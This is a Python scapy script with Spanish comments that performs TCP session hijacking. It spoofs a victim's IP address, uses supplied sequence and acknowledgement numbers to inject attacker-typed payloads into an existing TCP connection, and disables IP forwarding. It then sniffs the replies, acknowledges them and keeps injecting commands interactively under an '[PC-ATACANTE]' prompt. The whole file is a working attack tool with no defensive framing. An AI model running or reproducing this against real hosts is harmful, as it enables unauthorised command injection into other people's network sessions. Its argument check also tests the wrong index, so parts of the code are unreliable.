import sys
import logging
import threading
import os

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

try:
	from scapy.all import *
except:
	print("Necesitas tener scapy.")
	sys.exit(0)

ipsrc = sys.argv[1] #args[0] ip que suplanto
ipdst = sys.argv[2] #args[1]
sport = sys.argv[3] #args[1]
dport = sys.argv[4] #args[1]
seq = sys.argv[5]
ack = sys.argv[6]

if sys.argv[5] == 'None':
    iface= None
else:
    iface= sys.argv[7]

conf.verb=0

###Construyendo el paquete

capa_IP = IP(src=ipsrc, dst=ipdst)
capa_TCP = TCP(sport=int(sport), dport= int(dport), seq=int(seq), ack=int(ack), flags=24)

print("[PC-ATACANTE]\n******************************************")
payload = input(">> ")
payloadB = bytes(payload+'\n', 'utf-8')
paquete=capa_IP/capa_TCP/payloadB
#print(paquete)
os.system("echo 0 > /proc/sys/net/ipv4/ip_forward") # desactivo la retransmision
b=sr1(paquete, timeout = 0.4)
# print(type(b))
# print(b)

def recuperaSeq_Ack(pkt):
	#print("recuperaSeq_Ack")
	
	if IP in pkt:
		ip_src= pkt[IP].src
		ip_dst= pkt[IP].dst

	if TCP in pkt:
		tcp_sport = pkt[TCP].dport
		tcp_dport = pkt[TCP].sport
		tcp_seq = pkt[TCP].seq
		tcp_ack = pkt[TCP].ack
		tcp_flags= pkt[TCP].flags
		#print("IP(src:" + str(pkt[IP].src) + ", dst:" + str(pkt[IP].dst) + ")\nTCP(sport:" + str(pkt[TCP].sport) + ", dport:" + str(pkt[TCP].dport) +", seq:"+ str(pkt[TCP].seq) + ", ack:"+ str(pkt[TCP].ack) +", flags: "+ str(pkt[TCP].flags) +")\n")

		if tcp_flags == 24:
			capa_IP = IP(src=ip_dst, dst=ip_src)
			capa_TCP = TCP(sport=int(tcp_sport), dport= int(tcp_dport), seq=int(tcp_ack), ack=int(tcp_seq) + len(pkt.load.decode('UTF-8').strip()) + 1, flags=16)
			paquete=capa_IP/capa_TCP
			send(paquete, iface= iface)

			capa_TCP = TCP(sport=int(tcp_sport), dport= int(tcp_dport), seq=int(tcp_ack), ack=int(tcp_seq) + len(pkt.load.decode('UTF-8').strip()) + 1, flags=24)
			payload = input(">> ")
			payloadB = bytes(payload+'\n', 'utf-8')
			paquete=capa_IP/capa_TCP/payloadB
			b=sr1(paquete, iface= iface, timeout = 0.2)

			#print("IP--(src:" + str(pkt[IP].src) + ", dst:" + str(pkt[IP].dst) + ")\nTCP(sport:" + str(pkt[TCP].sport) + ", dport:" + str(pkt[TCP].dport) +", seq:"+ str(pkt[TCP].seq) + ", ack:"+ str(pkt[TCP].ack) +", flags: "+ str(pkt[TCP].flags) +")\n")


#sniff(filter="src {} and dst {} and tcp".format(ipsrc, ipdst), prn= recuperaSeq_Ack)
sniff(filter="src {} and dst {}".format(ipdst, ipsrc), iface=iface, prn= recuperaSeq_Ack)
